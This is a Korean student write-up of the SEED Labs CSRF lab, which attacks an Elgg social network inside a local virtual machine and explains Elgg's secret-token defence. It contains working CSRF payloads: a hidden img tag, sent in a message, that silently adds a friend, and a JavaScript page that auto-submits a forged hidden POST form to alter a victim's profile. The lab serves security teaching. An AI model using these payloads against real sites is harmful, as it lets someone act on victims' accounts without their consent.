# # Cross Site Request Forgery(CSRF or XSRF)

## 1. 개요

> CSRF 공격은 **희생자**, **신뢰 사이트**, **악성 사이트**를 포함합니다.
>
> 
>
> 희생자가 악성 사이트를 방문해 있는 동안, 
>
> 악성 사이트는 신뢰 사이트의 세션을 갖고 있는 **희생자의 정보**를 이용하여 **HTTP 요청을** 주입합니다.
>
> **신뢰할 수 있는 사이트에** 희생자 세션으로 **Request를 전송하여** 피해를 입힙니다.



### 실습 소개

> 이 실습은 **Elgg**라고 하는 소셜 네트워크 앱을 사용하여 **가상환경**에서 진행됩니다.
>
> 
>
> 이 실습에서 다루는 주제는 다음과 같습니다.
>
> - **CSRF 공격**
> - **CSRF 대응책 (비밀 토큰과 동일 사이트 쿠키)**
> - **HTTP GET 및 POST 요청**
> - **JavaScript 및 Ajax**



## 2. 실습 환경

> 이 실습은 **Ubuntu 16.04 VM**에서만 수행할 수 있으며, 이 실습을 진행하기 위해 다음과 같은 구성을 요약한다.



### Elgg 웹 어플리케이션

- 이미 사전에 Ubuntu VM 이미지에 설정되어 있다.
- Elgg 서버에 몇 개의 사용자 계정을 만들었고 다음과 같다.



![image-20200915100002829](C:\Users\RYZEN2\AppData\Roaming\Typora\typora-user-images\image-20200915100002829.png)

### DNS 구성

```java
// Attacker’s website
URL: http://www.csrflabattacker.com
Folder: /var/www/CSRF/Attacker/

//Victim website (Elgg)
URL: http://www.csrflabelgg.com
Folder: /var/www/CSRF/Elgg/
```



> 위의 각 URL 도메인 이름을 (127.0.0.1)에 매핑하도록 수정하였기 때문에 가상 시스템 내부에서만 액세스할 수 있습니다.



SEEDLAB Install Doc : https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf

```java
// 1. 가상 환경 설치
Oracle VM VirtualBox 6.0.4v를 다운받았습니다.
    
// 2. 사이트에서 제공한 환경 셋팅
SEEDUbuntu-16.04-32bit를 다운 받고, 32bit Ubuntu 가상환경에 이미지를 불러와 사용합니다.
    
// 3. VM 시작 및 저장
VM을 실행시키고, 상태를 저장해보았습니다.
    
이하 기타 문서에 수록된 부록 등의 내용은 담지 않았습니다.
```







### LAB 작업

#### 3-1. HTTP 요청 관찰하기

> CSRF 공격에서는 HTTP 요청을 위조해야 한다. 따라서 정상적인 HTTP 요청이 어떻게 생겼는지, 그것이 어떤 매개 변수를 사용하는지 등을 알 필요가 있다. 이를 위해 "HTTP Header Live"라는 Firefox Add-on을 사용한다.
>
>  **Elgg에서 HTTP GET 요청 및 HTTP POST 요청을 HTTP Header Live를 이용해 캡처하기**



#### 3-2. GET Request를 이용한 CSRF 공격

> 이 상황을 실험하기 위해 두 사람이 필요합니다. 엘리스와 보비.
>
> 보비는 앨리스와 친구가 되고 싶어하지만, 앨리스는 보비를 추가하는 것을 거부한다.
>
> **보비는 CSRF 공격을 활용해 목표를 달성하기로 한다.**



**CSRF 공격 과정**

> 1. 보비는 앨리스에게 (이메일or Elgg 포스팅을 통해) URL을 보낸다.
>
> 2. 앨리스가 궁금해하며 클릭한다.
> 3. 이 URL에서 앨리스는 보비의 웹사이트 (www.csrflabattacker.com)로 이동한다.
> 4. 당신이 보비라고 가정하고, 어떻게 웹 페이지의 내용을 구성할 수 있는지 설명해보자.
> 5. 앨리스가 URL을 클릭하자마자 보비가 친구 목록에 추가된다.



**설명**

> 앨리스가 친구 추가를 하도록 하려면 우선 정상적인 HTTP 요청이 어떤 모습인지 파악해야 한다.
>
> '**HTTP Header Live**' Tool을 사용하여 HTTP 요청이 어떤 모습인지 조사할 수 있다.
>
> 이 작업에서는 CSRF 공격을 하기 위해서 Javascript를 활용할 수 없다.
>
> 앨리스가 웹 페이지를 방문하는 즉시 그 페이지를 클릭하지 않고 공격을 성공시켜야 한다.
>
> **(힌트는, HTTP GET 요청을 트리거하는 img 태그를 사용할 수 있다.)**



> Elgg는 CSRF 공격으로부터 방어하기 위한 대응책을 만들었다.
>
> 친구추가 HTTP 요청에서 각 요청에는 두 개의 elg ts와 elg 토큰이 포함되어 있다.
>
> 정확한 토큰 값을 포함하지 않으면 요청이 받아들여지지 않는다.
>
> 하지만, 우리는 이 대책을 무력화시켰기 때문에 위조한 요청에 이 두 매개변수를 포함시킬 필요가 없다.



#### 3-3. POST Request를 이용한 CSRF 공격

**설명**

> 보비는 앨리스의 친구 목록에 자신을 추가한 후, 뭔가 더 하고 싶어졌다.
>
>  앨리스 프로필에 "보비는 나의 영웅"이라고 쓰고 싶어졌다.
>
> 보비는 CSRF 공격을 활용해 그 목표를 달성할 계획이다.



> 공격하는 방법은 앨리스의 Elgg 계정에 글을 올려 앨리스가 클릭하도록 한다.
>
> 메시지 내의 URL이 앨리스를 악의적인 사이트로 이끌어 CSRF 공격을 시작할 것이다.
>
> 공격 목표 : 앨리스의 프로필 정보를 수정하는 것.



> 사용자가 자신의 프로필을 수정하려면, Elgg 프로필 페이지에서 서버측에 POST 요청으로 양식을 제출해야 한다.



```javascript
// Elgg 프로필 수정에 보내지는 HTTP 요청 예시

http://www.csrflabelgg.com/action/profile/edit
POST /action/profile/edit HTTP/1.1
Host: www.csrflabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.csrflabelgg.com/profile/elgguser1/edit
Cookie: Elgg=p0dci8baqrl4i2ipv2mio3po05
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 642

__elgg_token=fc98784a9fbd02b68682bbb0e75b428b&__elgg_ts=1403464813 ✰
&name=elgguser1&description=%3Cp%3Iamelgguser1%3C%2Fp%3E
&accesslevel%5Bdescription%5D=2&briefdescription= Iamelgguser1
&accesslevel%5Bbriefdescription%5D=2&location=US
...... ✰

이 부분에서 elgg 토큰 값, elgg_ts값, name, description ... 을 확인할 수 있다.
```



> 요청의 구조를  파악한 후, 공격 웹 페이지에서 요청을 생성할 수 있어야 한다.
>
> CSRF 공격에 사용되는 샘플 코드는 다음과 같다.

```html
# CSRF 실습을 위한 샘플 코드

<html>
<body>
<h1>This page forges an HTTP POST request.</h1>

<script type="text/javascript">
	function forge_post() {
		var fields;
		// The following are form entries need to be filled out by attackers.
		// The entries are made hidden, so the victim won’t be able to see them.
        fields += "<input type=’hidden’ name=’name’ value=’Alice’>";
        fields += "<input type=’hidden’ name=’briefdescription’ value=’Boby is hero!’>";
        fields += "<input type=’hidden’ name=’accesslevel[briefdescription]’
        value=’2’>"; ➀
        fields += "<input type=’hidden’ name=’guid’ value=’****’>";        
        
        // Create a <form> element.
        var p = document.createElement("form");
        // Construct the form
        p.action = "http://www.example.com";
        p.innerHTML = fields;
        p.method = "post";
        // Append the form to the current page.
        document.body.appendChild(p);
        // Submit the form
        p.submit();
}
    
// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post();}
</script>
</body>
</html>
```



##### **다음 두 가지 질문**

**Q1. 위조된 HTTP 요청은 앨리스의 사용자 ID가 있어야 제대로 동작할 수 있다. 보비가 앨리스를 공격하기 전에 구체적으로 표적으로 삼으면 앨리스의 사용자 ID를 얻을 수 있는 방법을 찾을 수 있다. 보비는 앨리스의 Elgg 암호를 모르기 때문에 정보를 얻기 위해 앨리스의 계정에 로그인할 수 없다. 보비가 이 문제를 어떻게 해결할 수 있는지 설명해주세요.**

> 엘리스의 프로필에 접속했을 때, 보내지는 GET 요청을 보면 엘리스의 ID가 적혀 있을 것으로 생각했습니다**.**



**Q2. 보비가 자신의 악의적인 웹 페이지를 방문하는 모든 사람에게 공격을 개시하기를 원하는 경우, 그는 누가 웹페이지를 방문하는지 미리 알지 못한다. 희생자의 Elgg 프로필을 수정하기 위해 CSRF 공격을 계속할 수 있을까?**

> 사용자가 로그인되어 있는 경우라면 가능하다고 생각합니다. 위의 예시에서 name, description, 토큰값 등을 담아서 Request를 보내야 하는데, 로그인 되어 있다면 쿠키 값을 이용해 요청에 성공할 수 있을 것 같습니다.



####  3-4. Elgg에 대한 대책 실현하기

> Elgg는 CSRF 공격으로부터 방어하기 위해 내장된 대응책을 가지고 있다. 
>
> CSRF는 방어하기 어렵지 않으며, 일반적인 접근 방식 몇 가지가 있다. 
>
> 
>
> 1. **Secret-token approach** : 웹 애플리케이션은 그들 페이지에 비밀 토큰을 내장할 수 있으며, 이 페이지에서 나오는 모든 요청은 비밀 토큰을 운반하도록 한다.
>
>    --> CSRF 요청은 토큰을 얻을 수 없기 때문에, 위조 요청은 서버에 의해 쉽게 식별될 것이다.
>
> 2. **Referrer header approach** :  웹 어플리케이션도 헤더를 사용하여 요청 페이지를 확인할 수 있다. 그러나 프라이버시 문제로 인해 고객 측에서 이미 필터링 될 수 있다.
>
>    
>
>    Elgg는 비밀-토큰 접근법을 사용한다.
>
>    사용자 작업이 필요한 모든 양식에 elgg_ts와 elgg_token을 추가한다.

```php+HTML
<input type = "hidden" name = "__elgg_ts" value = "" />
<input type = "hidden" name = "__elgg_token" value = "" />
```



웹 페이지에 어떻게 동적으로 추가되는지 예시.

```php+HTML
$ts = time();
$token = generate_action_token($ts);
echo elgg_view(’input/hidden’, array(’name’ => ’__elgg_token’, ’value’ =>
$token));
echo elgg_view(’input/hidden’, array(’name’ => ’__elgg_ts’, ’value’ => $ts));
```



**Elgg 보안 토큰**은 사이트 타임스탬프, 사용자 세션의 해시값입니다. 이것으로 CSRF 공격에 대비하여 방어합니다. 아래 코드는 비밀 토큰 생성을 보여줍니다.

```javascript
function generate_action_token($timestamp) {
	$site_secret = get_site_secret();
	$session_id = session_id();

    // Session token
	$st = $_SESSION[’__elgg_session’];
	if (($site_secret) && ($session_id)) {
		return md5($site_secret . $timestamp . $session_id . $st);
	}

    return FALSE;
}
```



**Elgg 비밀 토큰의 유효성 검사.**

>  CSRF 공격으로부터 방어하기 위해 생성된 토큰과 타임스탬프를 검증한다. 토큰이 없거나 유효하지 않은 경우 작업이 거부되고 사용자가 리디렉션된다.



**대응책**

> 과제 : 공격자가 CSRF 공격에서 이러한 비밀 토큰을 보낼 수 없는 이유를 설명하십시오. 웹 페이지에서 비밀 토큰을 찾을 수 없는 이유는 무엇인가?



### 실습



#### 1. Elgg 서비스에서 Boby 계정으로 로그인

<center><image src="../images/boby_login.PNG"></center>

>  Elgg에 접속하여 명시된 계정 정보를 통해 Boby 계정에 로그인하였습니다.



<hr/>

#### 2. Alice 프로필에 접속하여 친구추가하기, CSRF를 위해 GET 요청 확인하기

<center><image src="../images/alice_profile.PNG"></center>

> Boby의 계정으로 Alice 프로필에 접속하여 Alice를 친구 목록에 추가하였습니다.



<center><image src="../images/get_alice2.PNG"></center>



```php+HTML
Request URL : http://www.csrflabelgg.com/action/friends/add?friend=42&__elgg_ts=1600186607&__elgg_token=Ex5zjJP-fsJ_Go-j1nZp7Q&__elgg_ts=1600186607&__elgg_token=Ex5zjJP-fsJ_Go-j1nZp7Q
Request method: GET

```

>  GET 요청을 보낼 때 URL과 ts값, 토큰값을 담아 보내는 것을 확인할 수 있습니다.



<hr/>

#### 3. Alice에게 메시지로 CSRF 공격을 통해 친구추가하게 만들기

```php+HTML
// Alice에게 보낸 메시지 내용

Hi Alice !

I Like you ! follow me plz..!

<img src="http://www.csrflabelgg.com/action/friends/add?friend=43&__elgg_ts=1600188479&__elgg_token=ENwob-DCMQ0SuxWRH29a2Q&__elgg_ts=1600188479&__elgg_token=ENwob-DCMQ0SuxWRH29a2Q" width="0" height="0" border="0">

```



<center><image src="../images/alice_mail.PNG"></center>

> Boby가 자신을 친구로 추가하도록 img 태그를 사용하여 Alice에게 CSRF 공격을 보냈습니다.



<center><image src="../images/csrf_get.PNG"></center>



> img 태그를 클릭하였더니,  Alice 계정에서 Boby를 친구로 등록하였습니다.
>
> GET 방식의 CSRF 공격이 진행됨! 



<hr/>

